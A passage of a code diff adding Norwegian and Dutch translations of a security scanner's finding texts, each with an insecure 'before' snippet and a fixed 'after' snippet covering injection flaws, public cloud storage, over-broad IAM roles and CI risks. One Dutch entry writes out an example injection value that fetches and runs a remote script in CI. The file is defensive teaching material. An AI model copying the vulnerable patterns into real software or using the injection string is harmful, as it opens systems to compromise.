+      'En statement med action "*" og resource "*" gir full tilgang til hver AWS-tjeneste og -ressurs — samme sjekk som allerede gjøres på den live IAM-tilstanden, her lest direkte fra koden før den i det hele tatt er brukt. Det kan være tiltenkt for en nødrolle, men bør bekreftes: til daglig bruk gi kun de tillatelsene som faktisk trengs.',
+    fix: {
+      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
+      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
+    },
+  },
+  "gcp-storage-bucket-public": {
+    title: "En Google Cloud Storage-bucket gjøres lesbar for alle",
+    description:
+      'En "google_storage_bucket_iam_member"- eller "google_storage_bucket_iam_binding"-ressurs gir en rolle til "allUsers" eller "allAuthenticatedUsers" — den første gjør bucketen lesbar for hvem som helst på internett, selv uten Google-konto; den andre for hvem som helst med en hvilken som helst Google-konto, ikke bare de som skal ha tilgang.',
+    fix: {
+      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
+      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:noen@example.com"  # kun de som faktisk skal ha tilgang, ikke allUsers/allAuthenticatedUsers\n}`,
+    },
+  },
+  "azure-storage-public-access": {
+    title: "Offentlig blob-tilgang er aktivert på en Azure-lagringskonto",
+    description:
+      '"allow_blob_public_access" er satt til true på en "azurerm_storage_account": alle som kjenner URL-en til en blob/container gjort offentlig kan lese den, uten noen autentisering.',
+    fix: {
+      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
+      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
+    },
+  },
+  "gcp-iam-overly-broad-role": {
+    title: "En Google Cloud IAM-rolle gir full tilgang (Owner/Editor)",
+    description:
+      'En "google_project_iam_binding"/"google_project_iam_member" (eller tilsvarende på organisasjons-/mappenivå) tildeler den primitive rollen "roles/owner" eller "roles/editor" — nesten fullstendig tilgang til hver tjeneste i prosjektet. Det kan være tiltenkt for en nødkonto, men bør bekreftes: til daglig bruk gi kun de mer spesifikke, forhåndsdefinerte rollene som faktisk trengs.',
+    fix: {
+      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
+      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # kun den forhåndsdefinerte rollen som faktisk trengs, ikke roles/owner\n  member  = "user:dev@example.com"\n}`,
+    },
+  },
+  "azure-role-assignment-owner": {
+    title: "En Azure-rolletildeling gir full tilgang (Owner)",
+    description:
+      'En "azurerm_role_assignment" tildeler rollen "Owner" — full tilgang, inkludert kontroll over andre brukeres tillatelser, over hele det tildelte scopet (abonnement, ressursgruppe...). Det kan være tiltenkt for en nødkonto, men bør bekreftes: til daglig bruk gi kun den mer spesifikke rollen som faktisk trengs (f.eks. "Contributor" på én enkelt ressursgruppe).',
+    fix: {
+      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
+      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # kun den mer spesifikke rollen som faktisk trengs, ikke Owner på hele abonnementet\n}`,
+    },
+  },
+  "weak-random-token": {
+    title: "Et sikkerhetstoken genereres med en tilfeldighetsgenerator som ikke er kryptografisk sikker",
+    description:
+      "En verdi med et navn som token/session/reset/otp/csrf genereres med Math.random() (JS), random.random() (Python) eller rand() (PHP) — generatorer ikke laget for sikkerhet, hvis sekvenser er forutsigbare. Et token generert slik kan gjettes eller rekonstrueres, noe som underminerer hensikten det finnes for (f.eks. en lenke for passordtilbakestilling som hvem som helst kunne forutsi).",
+    fix: {
+      before: `const resetToken = Math.random().toString(36).slice(2);`,
+      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ikke Math.random — uforutsigbar`,
+    },
+  },
+  "ldap-injection": {
+    title: "Et LDAP-filter bygges ved å sette sammen en verdi fra forespørselen direkte",
+    description:
+      'En linje som bygger et LDAP-filter (f.eks. "(uid=...)") inkluderer direkte en verdi hentet fra forespørselen, uten noen escaping av LDAP-spesialtegn. Den som kontrollerer denne verdien kan endre filterets logikk — for eksempel omgå en autentiseringssjekk eller lese katalogdata de ikke skulle se.',
+    fix: {
+      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
+      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-spesialtegn må alltid escapes før de brukes i et filter\nclient.search(base, { filter });`,
+    },
+  },
+  "xss-dangerous-html": {
+    title: "Tekst skrevet av brukere kan kjøre kode i nettleseren",
+    description:
+      "Innhold settes inn på siden som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) i stedet for som ren tekst. Inkluderer dette innholdet brukerinput, kan det inneholde skript som kjører i nettleseren til den som leser siden.",
+    fix: {
+      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
+      after: `<div>{comment.text}</div>\n// eller, om HTML trengs: DOMPurify.sanitize(comment.text)`,
+    },
+  },
+  "public-storage-bucket": {
+    title: "Lagringsplassen for opplastede filer er synlig for alle",
+    description:
+      "En storage-bucket (Supabase Storage, S3) er konfigurert som offentlig. Inneholder den dokumenter, bilder eller filer lastet opp av brukere, kan alle som kjenner — eller gjetter — stien få tilgang til dem uten autentisering.",
+    fix: {
+      before: `supabase.storage.createBucket("uploads", { public: true })`,
+      after: `supabase.storage.createBucket("uploads", { public: false })\n// server filer med tidsbegrensede signerte URL-er: createSignedUrl(path, 60)`,
+    },
+  },
+  "csrf-state-changing-get": {
+    title: "Én enkelt lenke er nok til å slette eller endre data",
+    description:
+      "En GET-rute utfører en operasjon som endrer data (stien inneholder delete/remove/update/edit). GET-forespørsler kjører bare ved å besøke en lenke eller laste et bilde fra et eksternt nettsted — det klassiske springbrettet for et CSRF-angrep.",
+    fix: {
+      before: `router.get("/posts/:id/delete", deletePost)`,
+      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
+    },
+  },
+  "insecure-token-storage": {
+    title: "Innloggingsdata lagret i nettleseren er ikke godt beskyttet",
+    description:
+      "Et tilgangstoken lagres i localStorage. I motsetning til en httpOnly-cookie kan ethvert skript som kjører på siden (inkludert et ondsinnet injisert via XSS) lese og stjele det.",
+    fix: {
+      before: `localStorage.setItem("authToken", token)`,
+      after: `// sett tokenet som en httpOnly-cookie fra serveren:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "open-redirect": {
+    title: "Nettstedet kan brukes til å omdirigere til et svindelnettsted",
+    description:
+      "Nettstedet omdirigerer brukeren til en adresse hentet direkte fra forespørselen (query, body, params) uten å sjekke at det er et kjent domene. En lenke som ser ut til å peke til nettstedet ditt kan faktisk føre til en phishing-side.",
+    fix: {
+      before: `res.redirect(req.query.next)`,
+      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
+    },
+  },
+  idor: {
+    title: "Å endre et tall i adressen kan vise andres data",
+    description:
+      "En databasespørring bruker direkte en identifikator hentet fra URL-en (req.params.id) uten å sjekke, i de nærmeste linjene, at den tilhører brukeren som gjør forespørselen. Å endre id-en i adressen kan gi tilgang til en annen brukers data — Insecure Direct Object Reference.",
+    fix: {
+      before: `const order = await Order.findById(req.params.id)`,
+      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
+    },
+  },
+  "header-injection": {
+    title: "En verdi fra forespørselen havner direkte i en HTTP-responsheader",
+    description:
+      "En HTTP-responsheader settes med en verdi hentet direkte fra forespørselen (query, body, params), uten å sjekke at den ikke inneholder linjeskift (CRLF). En angriper kan sette inn ekstra headere eller til og med en helt annen respons — response splitting — og potensielt manipulere caching, cookies eller innholdet som vises til andre brukere.",
+    fix: {
+      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
+      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
+    },
+  },
+  "docker-missing-user": {
+    title: "Dockerfilen setter ikke en ikke-root-bruker",
+    description:
+      "Ingen USER-instruksjon i Dockerfilen: uten en slik kjører containeren som root. Klarer en angriper å kjøre kode inne i containeren (f.eks. ved å utnytte et sårbart bibliotek), gjør root-tilgang inne i containeren en eskalering til verten — eller en bredere konsekvens på det omkringliggende systemet — enklere.",
+    fix: {
+      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
+      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
+    },
+  },
+  "k8s-missing-run-as-non-root": {
+    title: "Kubernetes-manifestet håndhever ikke eksplisitt kjøring som en ikke-root-bruker",
+    description:
+      'Ingen "runAsNonRoot" noe sted i manifestet (verken på pod- eller containernivå): uten å sette dette kjører en container som den brukeren bildet dens definerer — ofte root som standard, hvis ikke bildet selv har endret det. Setter du det eksplisitt til true, feiler poden å starte hvis bildet fortsatt prøver å kjøre som root, i stedet for at du først finner det ut etter en hendelse.',
+    fix: {
+      before: `containers:\n  - name: app\n    image: myapp:1.0`,
+      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
+    },
+  },
+  "gha-unpinned-action": {
+    title: "En tredjepartsaction i CI-en er ikke låst til en presis versjon (commit SHA)",
+    description:
+      'Workflowen bruker en tredjepartsaction referert med tag eller branch (f.eks. "@v1", "@main") i stedet for commit SHA. Den som vedlikeholder den — eller den som kompromitterer kontoen deres — kan når som helst flytte den referansen til et annet commit, og dermed stille endre hva som kjører i CI-en, med tilgang til dens hemmeligheter. Et commit SHA peker alltid til nøyaktig samme kode.',
+    fix: {
+      before: `uses: some-org/some-action@v1`,
+      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst til commit SHA — oppdater SHA-en når du oppdaterer versjonen`,
+    },
+  },
+  "gha-excessive-permissions": {
+    title: "Workflowen gir seg selv alle tokenets tillatelser i stedet for kun dem den bruker",
+    description:
+      '"permissions: write-all" gir workflowens GITHUB_TOKEN skrivetilgang til alt — issues, pull requests, pakker, deployments — selv om workflowen bare bruker deler av det. Blir et steg i workflowen kompromittert (en ondsinnet avhengighet, et injisert skript), øker disse bredere tillatelsene hva den som utnytter det kan gjøre.',
+    fix: {
+      before: `permissions: write-all`,
+      after: `permissions:\n  contents: read\n  pull-requests: write  # kun de tillatelsene workflowen faktisk bruker`,
+    },
+  },
+  "insecure-cookie-flags": {
+    title: "En sesjons- eller autentiseringscookie settes uten flaggene Secure og HttpOnly",
+    description:
+      'En cookie med et navn som ligner på sesjon/autentisering/token settes uten "httpOnly" og "secure" blant innstillingene. Uten httpOnly kan JavaScript på siden — inkludert kode injisert via XSS — lese den cookien. Uten secure kan den også sendes over en ukryptert HTTP-tilkobling.',
+    fix: {
+      before: `res.cookie("session", sessionId)`,
+      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
+    },
+  },
+  "no-login-rate-limit": {
+    title: "Innloggingsskjemaet blokkerer ikke for mange forsøk på rad",
+    description:
+      "En innloggingsrute er definert i filen, men det finnes ingen spor av rate-limiting-middleware i samme fil. Uten en grense for antall forsøk kan en angriper prøve passord i sekvens (brute force) uten å bli bremset.",
+    fix: {
+      before: `router.post("/login", loginHandler)`,
+      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
+    },
+  },
+  "sensitive-data-in-logs": {
+    title: "Passord eller sensitive data havner i logger",
+    description:
+      "Et kall til console.log (eller lignende) inkluderer en variabel kalt password, token, secret eller apiKey. Havner disse loggene i en ekstern tjeneste eller en fil, forblir sensitive data eksponert mye lenger enn nødvendig.",
+    fix: {
+      before: `console.log("login attempt", { email, password })`,
+      after: `console.log("login attempt", { email })`,
+    },
+  },
+  "docker-unpinned-base-image": {
+    title: 'Dockerfilens basisbilde bruker taggen ":latest"',
+    description:
+      'En FROM-instruksjon bruker eksplisitt taggen ":latest" i stedet for en presis versjon. "latest" endrer seg over tid: samme build, gjort på nytt på et annet tidspunkt, kan få en annen versjon av basisbildet — en ikke-reproduserbar build, og en uønsket oppdatering kan komme uten at noen har bestemt at den skal.',
+    fix: {
+      before: `FROM node:latest`,
+      after: `FROM node:20.11-slim`,
+    },
+  },
+  "docker-add-remote-url": {
+    title: "Dockerfilen laster ned en ekstern fil med ADD i stedet for COPY",
+    description:
+      "En ADD-instruksjon med en http/https-URL laster ned en fil fra internett under builden, uten integritetssjekk og med innholdet usynlig i repositoriet. Blir den URL-en noensinne kompromittert, trekker builden inn vilkårlig innhold uten at noen merker det bare ved å lese Dockerfilen.",
+    fix: {
+      before: `ADD https://example.com/install.sh /tmp/install.sh`,
+      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<expected hash>  /tmp/install.sh" | sha256sum -c -`,
+    },
+  },
+  "vulnerable-dependency": (original) => ({
+    title: original.title.replace("Dipendenza vulnerabile:", "Sårbar avhengighet:"),
+    description: original.description,
+    fix: {
+      before: original.fix.before,
+      after: original.fix.after.replace(
+        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
+        "Ingen rettet versjon kjent ennå — vurder en alternativ pakke eller følg med på prosjektets oppdateringer."
+      ),
+    },
+  }),
+},
+  nl: {
+  "supabase-service-role-in-client": {
+    title: "De geheime sleutel van Supabase komt terecht in een bestand dat naar de browser wijst",
+    description:
+      "Een variabele met een publiek voorvoegsel (bijv. NEXT_PUBLIC_, VITE_) of een client-side bestand verwijst naar de service role key van Supabase. Deze sleutel omzeilt Row Level Security: als die in de browserbundel terechtkomt, kan iedereen hem lezen en zich voordoen als databasebeheerder.",
+    fix: {
+      before: `// components/Dashboard.tsx
+const supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
+      after: `// app/api/admin/route.ts (alleen server)
+const supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
+    },
+  },
+  "hardcoded-secret": {
+    title: "Wachtwoorden of geheime sleutels staan rechtstreeks in de code",
+    description:
+      "Een API-sleutel, token of wachtwoord lijkt als letterlijke waarde te zijn geschreven in plaats van uit een omgevingsvariabele te worden gelezen. Iedereen die de broncode leest (of de repository, als die openbaar is) krijgt dat geheim in handen.",
+    fix: {
+      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
+      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
+    },
+  },
+  "env-file-with-real-values": {
+    title: "Een bestand met de echte wachtwoorden van het project zit tussen de geanalyseerde bestanden",
+    description:
+      "Een .env-bestand met echte waarden (geen .env.example) is opgenomen in de analyse. Als dit bestand in een repository of een openbare deploy terechtkomt, liggen alle inloggegevens die het bevat bloot.",
+    fix: {
+      before: `# .env (per ongeluk gecommit)
+DATABASE_URL=postgres://user:realpassword@db.host/prod`,
+      after: `# .env.example (gecommit)
+DATABASE_URL=postgres://user:password@localhost/dev
+
+# .env blijft buiten de repo (.gitignore)`,
+    },
+  },
+  "missing-row-level-security": {
+    title: "Iedereen kan de gegevens van alle gebruikers lezen of wijzigen",
+    description:
+      "Row Level Security is uitgeschakeld, of een policy staat toegang toe aan iedereen (USING (true)) zonder te controleren wie de aanvraag doet. Elke geauthenticeerde gebruiker — of zelfs een anonieme — kan de gegevens van alle anderen lezen of wijzigen.",
+    fix: {
+      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
+      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;
+CREATE POLICY "owners only" ON public.orders
+  USING (auth.uid() = user_id);`,
+    },
+  },
+  "sql-injection": {
+    title: "Een door de gebruiker ingevoerde waarde wordt rechtstreeks in een databasequery geplakt",
+    description:
+      "Een SQL-query wordt opgebouwd door een string rechtstreeks te concateneren of te interpoleren in plaats van parameters te gebruiken. Als die tekst (ook indirect) van een gebruiker komt, kan die de query zelf veranderen — SQL-injectie.",
+    fix: {
+      before: `db.query(\`SELECT * FROM users WHERE email = '\${email}'\`)`,
+      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
+    },
+  },
+  "plaintext-password-storage": {
+    title: "Wachtwoorden lijken niet beschermd te zijn",
+    description:
+      "Een wachtwoordveld wordt precies zo opgeslagen als het in het verzoek binnenkwam, en er komt geen hashfunctie (bcrypt, argon2, scrypt) voor in het bestand. Als de database wordt gecompromitteerd, is elk wachtwoord direct bruikbaar.",
+    fix: {
+      before: `await db.users.insert({ email, password: req.body.password })`,
+      after: `const hashed = await bcrypt.hash(req.body.password, 12)
+await db.users.insert({ email, password: hashed })`,
+    },
+  },
+  "hardcoded-jwt-secret": {
+    title: "Het geheim dat wordt gebruikt om logins te ondertekenen staat in platte tekst in de code",
+    description:
+      "Het geheim dat wordt doorgegeven aan jwt.sign / jwt.verify (of de variabele JWT_SECRET) is een letterlijke waarde in de code in plaats van afkomstig uit een omgevingsvariabele. Iedereen die het leest kan geldige toegangstokens voor elke gebruiker aanmaken.",
+    fix: {
+      before: `jwt.sign(payload, "super-secret-key-123")`,
+      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
+    },
+  },
+  "command-injection": {
+    title: "De server kan worden gedwongen externe commando's uit te voeren",
+    description:
+      "Een functie die systeemcommando's uitvoert (exec, execSync, spawn) ontvangt een string die is opgebouwd door interpolatie of concatenatie. Als een deel van die string uit gebruikersinvoer komt, kan wie dat controleert willekeurige commando's op de server uitvoeren.",
+    fix: {
+      before: `execSync(\`convert \${filename} output.png\`)`,
+      after: `execFile("convert", [filename, "output.png"])`,
+    },
+  },
+  "path-traversal": {
+    title: "Een bestand op de server kan worden gelezen of geschreven door het pad van buitenaf te kiezen",
+    description:
+      'Een functie die een bestand leest, schrijft of verstuurt, haalt het pad rechtstreeks uit een waarde van het verzoek (query, body, params) zonder te controleren dat dit binnen een toegestane map blijft. Een aanvaller kan "../" invoegen om buiten de bedoelde map te komen en willekeurige bestanden op de server te lezen of overschrijven (bijv. een configuratiebestand met inloggegevens).',
+    fix: {
+      before: `app.get("/download", (req, res) => {
+  res.sendFile(req.query.file)
+})`,
+      after: `const ALLOWED_DIR = path.resolve("./uploads")
+app.get("/download", (req, res) => {
+  const target = path.resolve(ALLOWED_DIR, req.query.file)
+  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Pad niet toegestaan")
+  res.sendFile(target)
+})`,
+    },
+  },
+  "nosql-injection": {
+    title: "Een door de gebruiker ingevoerde waarde wordt als code uitgevoerd binnen een MongoDB-query",
+    description:
+      "De $where-operator van MongoDB voert voor elk document server-side JavaScript uit — als die string wordt opgebouwd door een waarde van de gebruiker te concateneren, kan wie dat controleert willekeurige code laten uitvoeren binnen de context van de database, niet alleen het filter wijzigen zoals bij een gewone SQL-injectie.",
+    fix: {
+      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
+      after: `db.collection.find({ username: username })`,
+    },
+  },
+  ssti: {
+    title: "Een door de gebruiker ingevoerde waarde wordt geïnterpreteerd als een template, niet als data",
+    description:
+      "Een functie die een template compileert/rendert ontvangt de HELE template uit een waarde van het verzoek, in plaats van een vaste template te gebruiken en alleen de data door te geven. Een aanvaller kan rechtstreeks in de syntax van de template-engine schrijven (bijv. {{7*7}} voor Jinja2) en code op de server uitvoeren — Server-Side Template Injection, wat vaak leidt tot het uitvoeren van willekeurige commando's, niet alleen een weergaveprobleem zoals XSS.",
+    fix: {
+      before: `return render_template_string(request.args.get("name"))`,
+      after: `return render_template("profile.html", name=request.args.get("name"))`,
+    },
+  },
+  xxe: {
+    title: "De XML-parser kan worden gedwongen bestanden te lezen of externe verzoeken te doen",
+    description:
+      "Een XML-parser (DocumentBuilderFactory) wordt aangemaakt zonder externe entiteiten (DOCTYPE) expliciet uit te schakelen in de nabije regels. Als de parser XML ontvangt uit een niet-vertrouwde bron, kan een aanvaller een externe entiteit definiëren om bestanden op de server te lezen of hem een adres naar keuze te laten benaderen — XML External Entity.",
+    fix: {
+      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+DocumentBuilder builder = factory.newDocumentBuilder();`,
+      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+DocumentBuilder builder = factory.newDocumentBuilder();`,
+    },
+  },
+  "docker-hardcoded-secret": {
+    title: "Een geheim staat rechtstreeks in een ENV- of ARG-instructie in de Dockerfile",
+    description:
+      "Een variabele met een naam als password/secret/token/key heeft een letterlijke waarde in een ENV- of ARG-instructie. In tegenstelling tot een .env-bestand (dat normaal niet in de image terechtkomt), wordt deze waarde ingebakken in de Docker-image zelf — iedereen die deze kan pullen of de laaggeschiedenis kan inspecteren, kan hem terugvinden, zelfs als de regel in een latere versie van de Dockerfile wordt verwijderd.",
+    fix: {
+      before: `ENV DB_PASSWORD=supersecret123`,
+      after: `ARG DB_PASSWORD
+ENV DB_PASSWORD=$DB_PASSWORD
+# meegegeven met: docker build --build-arg DB_PASSWORD=*** (of, nog beter,
+# een BuildKit secret mount, die nooit in de laaggeschiedenis terechtkomt)`,
+    },
+  },
+  "k8s-privileged-container": {
+    title: "Een container in het Kubernetes-manifest draait als privileged",
+    description:
+      '"privileged: true" in de securityContext van een container schakelt bijna alle gebruikelijke isolatie tussen container en host uit: de container krijgt toegang tot de apparaten van de host, kan de netwerkconfiguratie wijzigen, en kan in veel gevallen effectief rootgang tot de machine verkrijgen waarop hij draait. Vrijwel nooit nodig voor een normale app.',
+    fix: {
+      before: `securityContext:
+  privileged: true`,
+      after: `securityContext:
+  privileged: false
+  capabilities:
+    add: ["NET_BIND_SERVICE"]  # alleen de capabilities die echt nodig zijn`,
+    },
+  },
+  "k8s-plaintext-secret-env": {
+    title: "Een geheim staat in platte tekst in een env-variabele van een Kubernetes-manifest",
+    description:
+      "Een omgevingsvariabele met een naam als password/secret/token/key heeft een letterlijke waarde (\"value:\") in plaats van te worden gelezen uit een Secret (\"valueFrom.secretKeyRef\"). Het manifest zelf — vaak gecommit naar een repository — bevat daardoor het geheim in platte tekst, zichtbaar zelfs voor iemand die alleen de configuratie kan lezen, niet per se commando's in de cluster kan uitvoeren.",
+    fix: {
+      before: `env:
+  - name: DB_PASSWORD
+    value: supersecret123`,
+      after: `env:
+  - name: DB_PASSWORD
+    valueFrom:
+      secretKeyRef:
+        name: db-credentials
+        key: password`,
+    },
+  },
+  "terraform-open-security-group": {
+    title: "Een Terraform-security group opent een gevoelige poort voor het hele internet",
+    description:
+      'Een regel met "cidr_blocks" die 0.0.0.0/0 bevat (elk IP-adres) staat dicht bij een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort (MySQL, Postgres, MongoDB, Redis, SQL Server). Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
+    fix: {
+      before: `ingress {
+  from_port   = 22
+  to_port     = 22
+  protocol    = "tcp"
+  cidr_blocks = ["0.0.0.0/0"]
+}`,
+      after: `ingress {
+  from_port   = 22
+  to_port     = 22
+  protocol    = "tcp"
+  cidr_blocks = ["10.0.0.0/16"]  # alleen je eigen privénetwerk, of een bastion host
+}`,
+    },
+  },
+  "gcp-firewall-open-to-internet": {
+    title: "Een Google Cloud-firewallregel opent een gevoelige poort voor het hele internet",
+    description:
+      'Een "google_compute_firewall"-resource met "source_ranges" die 0.0.0.0/0 bevat (elk IP-adres) staat verkeer toe naar een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort (MySQL, Postgres, MongoDB, Redis, SQL Server). Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
+    fix: {
+      before: `resource "google_compute_firewall" "allow-ssh" {
+  allow {
+    protocol = "tcp"
+    ports    = ["22"]
+  }
+  source_ranges = ["0.0.0.0/0"]
+}`,
+      after: `resource "google_compute_firewall" "allow-ssh" {
+  allow {
+    protocol = "tcp"
+    ports    = ["22"]
+  }
+  source_ranges = ["10.0.0.0/16"]  # alleen je eigen privénetwerk, of een bastion host
+}`,
+    },
+  },
+  "azure-nsg-open-to-internet": {
+    title: "Een Azure-netwerkregel opent een gevoelige poort voor het hele internet",
+    description:
+      'Een netwerkbeveiligingsregel ("azurerm_network_security_rule", of een "security_rule"-blok binnen "azurerm_network_security_group") met "source_address_prefix" ingesteld op "*" of "0.0.0.0/0", richting "Inbound" en toegang "Allow", dicht bij een gevoelige poort — SSH (22), RDP (3389), of een typische databasepoort. Iedereen op internet kan proberen verbinding te maken met die dienst, niet alleen wie dat zou moeten.',
+    fix: {
+      before: `resource "azurerm_network_security_rule" "allow-ssh" {
+  direction              = "Inbound"
+  access                 = "Allow"
+  destination_port_range = "22"
+  source_address_prefix  = "*"
+}`,
+      after: `resource "azurerm_network_security_rule" "allow-ssh" {
+  direction              = "Inbound"
+  access                 = "Allow"
+  destination_port_range = "22"
+  source_address_prefix  = "10.0.0.0/16"  # alleen je eigen privénetwerk, of een bastion host
+}`,
+    },
+  },
+  "terraform-hardcoded-secret": {
+    title: "Een geheim staat als standaardwaarde van een Terraform-variabele",
+    description:
+      'Een variabele met een naam als password/secret/token/key heeft een letterlijke waarde in zijn "default". In tegenstelling tot een waarde die tijdens runtime wordt doorgegeven (tfvars, TF_VAR_*-omgevingsvariabelen), komt een default in de broncode terecht — en als de repository gedeeld of openbaar is, kan iedereen hem zien, zelfs zonder toegang tot de Terraform-state.',
+    fix: {
+      before: `variable "db_password" {
+  default = "supersecret123"
+}`,
+      after: `variable "db_password" {
+  # geen default: geef hem mee met een .tfvars-bestand (buiten git) of een TF_VAR_db_password-omgevingsvariabele
+  sensitive = true
+}`,
+    },
+  },
+  "gha-script-injection": {
+    title: "Een waarde die door een externe gebruiker wordt gecontroleerd komt rechtstreeks in een shellcommando van de CI terecht",
+    description:
+      "Een \"run:\"-commando in een GitHub Actions-workflow interpoleert rechtstreeks een waarde zoals een titel van een pull request, een branchnaam of de tekst van een reactie — allemaal schrijfbaar door iedereen die een pull request of reactie opent, zelfs vanuit een externe fork. Een waarde zoals `\"; curl malware.sh | sh #` zou willekeurige commando's in de CI uitvoeren, met toegang tot elk geheim dat in die workflow beschikbaar is.",
+    fix: {
+      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
+      after: `- env:
+    PR_TITLE: \${{ github.event.pull_request.title }}
+  run: echo "$PR_TITLE"  # meegegeven als omgevingsvariabele, nooit rechtstreeks in het commando geïnterpoleerd`,
+    },
+  },
+  "gha-pull-request-target-checkout": {
+    title: "De workflow voert de code van een externe pull request uit met toegang tot de geheimen van de repository",
+    description:
+      'De workflow gebruikt "pull_request_target" — die draait met de rechten en geheimen van de basisrepository, zelfs voor een pull request die vanuit een niet-gerelateerde fork is geopend — en checkt de eigen code van de pull request uit ("github.event.pull_request.head"), niet de basisbranch. Wie de pull request opent, krijgt zo effectief zijn eigen code uitgevoerd met toegang tot die geheimen.',
+    fix: {
+      before: `on:
+  pull_request_target:
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}`,
+      after: `on:
+  pull_request_target:
+jobs:
+  build:
+    steps:
+      # Checkt de basisbranch uit, niet de code van de PR — of gebruik
+      # "pull_request" in plaats van "pull_request_target" als je de
+      # bredere rechten/geheimen niet nodig hebt.
+      - uses: actions/checkout@v4`,
+    },
+  },
+  "insecure-deserialization": {
+    title: "Verzoekdata wordt gedeserialiseerd met een formaat dat code kan uitvoeren",
+    description:
+      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) of de node-serialize-library (Node) deserialiseren een waarde die rechtstreeks uit het verzoek komt. In tegenstelling tot JSON kunnen deze formaten code representeren en uitvoeren tijdens het deserialiseren zelf — wie de verzonden waarde controleert, kan willekeurige code op de server laten uitvoeren.",
+    fix: {
+      before: `data = pickle.loads(request.data)`,
+      after: `import json
+data = json.loads(request.data)  # JSON voert tijdens het parsen nooit code uit, in tegenstelling tot pickle`,
+    },
+  },
+  "jwt-none-algorithm": {
+    title: 'De code accepteert expliciet ongetekende JWT-tokens ("none"-algoritme)',
+    description:
+      '"none" komt voor tussen de geaccepteerde algoritmes om een JWT-token te verifiëren. Een token met het "none"-algoritme heeft geen handtekening om te verifiëren: iedereen kan er een maken met willekeurige inhoud (bijv. een beheerdersrol) en de code zou hem als geldig accepteren.',
+    fix: {
+      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
+      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // neem "none" nooit op tussen de geaccepteerde algoritmes`,
+    },
+  },
+  "unprotected-new-table": {
+    title: "Er lijkt een nieuwe tabel te worden aangemaakt zonder bescherming",
+    description:
+      "Een SQL-migratie maakt een tabel aan maar schakelt Row Level Security voor diezelfde tabel niet in binnen hetzelfde bestand. Zolang dit zo blijft, begint de tabel zonder enige beperking op wie hem kan lezen of beschrijven.",
+    fix: {
+      before: `CREATE TABLE public.invoices (
+  id uuid PRIMARY KEY,
+  user_id uuid REFERENCES auth.users
+);`,
+      after: `CREATE TABLE public.invoices (
+  id uuid PRIMARY KEY,
+  user_id uuid REFERENCES auth.users
+);
+ALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
+    },
+  },
+  "permissive-cors": {
